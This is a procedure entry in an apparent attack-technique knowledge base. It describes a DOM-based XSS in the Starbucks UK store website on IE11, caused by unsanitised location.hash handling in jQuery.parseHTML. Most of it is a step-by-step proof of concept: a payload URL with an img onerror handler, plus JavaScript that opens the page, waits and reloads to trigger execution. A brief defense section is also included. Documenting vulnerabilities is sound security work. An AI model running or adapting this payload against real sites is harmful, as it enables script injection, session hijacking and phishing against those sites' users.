---
id: proc-uuid-1
tags:
  - xss
  - dom-xss
  - ie11
  - javascript
  - jquery
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/starbucks-xss-poc-setup]]'
  - '[[commands/starbucks-xss-poc-open]]'
  - '[[commands/starbucks-xss-poc-wait]]'
  - '[[commands/starbucks-xss-poc-reload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:18.637Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-DOM-XSS-via-Hash-Reload-on-IE11

## Summary

This procedure exploits a DOM-based XSS vulnerability in the Starbucks UK store website by crafting a malicious URL with a JavaScript payload in the location.hash, loading it in IE11, waiting for initialization, and reloading to trigger unsanitized parsing via jQuery.parseHTML in the _observeHistory function.

## Description

The vulnerability stems from the _observeHistory function in generic.min.js, which monitors location.hash changes and uses $('a[href$="' + _currentHash + '"]').click() to handle navigation. In IE11, this leads to jQuery.parseHTML processing the hash as HTML without sanitization, allowing event handlers like onerror to execute arbitrary JavaScript. The attack requires IE11 due to browser-specific parsing behaviors and a reload to invoke the function after initial load. Successful exploitation enables client-side attacks such as session hijacking or phishing in the victim's browser context.

## Requirements

1. Access to IE11 browser for testing/exploitation
2. Ability to execute JavaScript in a console or HTML page (e.g., local file or dev tools)
3. Internet connectivity to reach https://store.starbucks.co.uk
4. Understanding of DOM manipulation and hash-based navigation

## Defense

Defensive measures and detection strategies:

- Sanitize all location.hash inputs before passing to DOM APIs like parseHTML
- Use Content Security Policy (CSP) to restrict inline scripts and eval
- Avoid jQuery.parseHTML for user-controlled data; prefer text-based insertion
- Monitor for anomalous alert() or console executions in client-side logs
- Deprecate support for legacy browsers like IE11

## Objectives

1. Execute arbitrary JavaScript in the Starbucks store page context on IE11
2. Demonstrate payload delivery via URL hash without server-side interaction
3. Highlight browser-specific vulnerabilities in hash processing

## Instructions

### Step 1: Setup Malicious URL

**Context**: Define the target URL with an XSS payload in the hash fragment, using an img tag that triggers onerror on load failure.

**Command** ([[commands/starbucks-xss-poc-setup]]):
```javascript
function poc() {
  var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>';
  // Proceed to open window
}
```

> This sets up the URL variable. Expected output: No execution yet; just variable assignment. Verify by logging url to console.

### Step 2: Open Page in IE11

**Context**: Launch the URL in a new IE11 window to perform initial load and JavaScript initialization without triggering the hash immediately.

**Command** ([[commands/starbucks-xss-poc-open]]):
```javascript
var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>',
  win = window.open(url);
```

> Opens the page. Expected output: Starbucks store loads in new tab/window. Check IE11 dev tools for no errors.

### Step 3: Wait for Full Initialization

**Context**: Delay to ensure _observeHistory and jQuery tabs are active, preventing premature failure.

**Command** ([[commands/starbucks-xss-poc-wait]]):
```javascript
setTimeout(function(){win.location=url}, 5000);
```

> Waits 5 seconds. Expected output: Page stabilizes; no alerts yet.

### Step 4: Reload to Process Hash

**Context**: Change location.hash to invoke _observeHistory, leading to parseHTML on the payload.

**Command** ([[commands/starbucks-xss-poc-reload]]):
```javascript
win.location=url;
```

> Triggers reload. Expected output: alert(1) executes due to onerror in parsed HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/starbucks-xss-poc-setup]]
- [[commands/starbucks-xss-poc-open]]
- [[commands/starbucks-xss-poc-wait]]
- [[commands/starbucks-xss-poc-reload]]

## Tools Used


## Tags

- xss
- dom-xss
- ie11
